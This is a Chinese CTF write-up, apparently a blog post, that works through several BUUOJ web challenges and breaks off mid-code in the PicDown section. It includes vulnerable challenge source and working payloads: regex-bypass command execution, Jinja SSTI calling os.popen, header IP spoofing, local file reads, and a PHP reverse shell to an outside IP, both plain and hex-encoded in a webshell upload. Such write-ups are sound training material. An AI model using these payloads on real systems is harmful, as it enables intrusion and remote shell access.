    <content type="html"><![CDATA[<h1 id="buuoj一次刷个够"><a href="#buuoj一次刷个够" class="headerlink" title="buuoj一次刷个够"></a>buuoj一次刷个够</h1><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>网上扒来源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>preg_match对原来的字符串没有开启多行匹配, PATH环境变量被改了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;%0a&quot;cmd&quot;: &quot;/bin/cat /home/rceservice/flag&quot;%0a&#125;</span><br></pre></td></tr></table></figure><p>第二种解法时正则回溯最大次数绕过</p><h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>布尔注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stunum=if(1,2,1)</span><br><span class="line">stunum=1^2</span><br></pre></td></tr></table></figure><p>两种手法都能测出来, 之后就是编写脚本, 这里就不浪费时间了</p><h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b%20u%20p%20t=23333%0a</span><br></pre></td></tr></table></figure><p>到secrettw.php</p><p>源码里有一点jsFuck, 运行一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240530144140854.png" alt="image-20240530144140854"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getIp</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>换ip用Client-IP: 127.0.0.1, 不过这里不回显ip, 但确实已经换掉了</p><p>之后是反算这个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unchange</span>(<span class="params"><span class="variable">$v</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) - <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$re</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unchange</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/secrettw.php?2333=php://input&amp;file=ZmpdYSZmXGI=</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>d3663114-3245-44e1-9628-79b302dcc843.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Client-IP</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>20</span><br><span class="line"></span><br><span class="line"><span class="language-applescript">todat <span class="keyword">is</span> a happy <span class="built_in">day</span></span></span><br></pre></td></tr></table></figure><h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这题之前已经见过了, 直接看payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/config.php/%ff?source</span><br></pre></td></tr></table></figure><p>basename会返回config.php这个字符串, 利用%ff绕过preg_match </p><blockquote><p>网址：<a href="https://www.example.com/php/index.php/test/foo?username=root">https://www.example.com/php/index.php/test/foo?username=root</a></p><p>$_SERVER[‘PHP_SELF’] 得到：&#x2F;php&#x2F;index.php&#x2F;test&#x2F;foo<br>$_SERVER[‘SCRIPT_NAME’] 得到：&#x2F;php&#x2F;index.php<br>$_SERVER[‘REQUEST_URI’] 得到：&#x2F;php&#x2F;index.php&#x2F;test&#x2F;foo?username&#x3D;root</p></blockquote><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>Fenjin秒了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;cycler.next[&#x27;__g&#x27;&#x27;lobals__&#x27;].__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">waf</span>(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>hex编码一下执行php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;107.148.75.202&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;?=exec(hex2bin(&quot;706870202d72202724736f636b3d66736f636b6f70656e28223130372e3134382e37352e323032222c31323334293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27&quot;))?&gt;</span><br></pre></td></tr></table></figure><p>flag在根目录</p><h2 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2><p>有这样一个参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/page?url=</span><br></pre></td></tr></table></figure><p>一开始按ssrf做发现file协议读取不了任何文件, 也探测不到其他端口的开放</p><p>看了WP才发现原来用的是python2的<code>urllib</code>的<code>urlopen</code>，和<code>urllib2</code>中的<code>urlopen</code>明显区别就是<code>urllib.urlopen</code>支持将路径作为参数去打开对应的本地路径，所以可以直接填入路径读取文件</p><p>不知道怎么看出来的python2的urllib, 只能看到响应头  Server: openresty</p><p>首先可以读当前的服务 &#x2F;proc&#x2F;self&#x2F;cmdline  </p><p>读取web服务的源码 &#x2F;page?url&#x3D;&#x2F;app&#x2F;app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/page&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=beautiful.jpg&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">&quot;HACK ERROR!&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">&quot;SOMETHING WRONG!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manager</span>():</span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    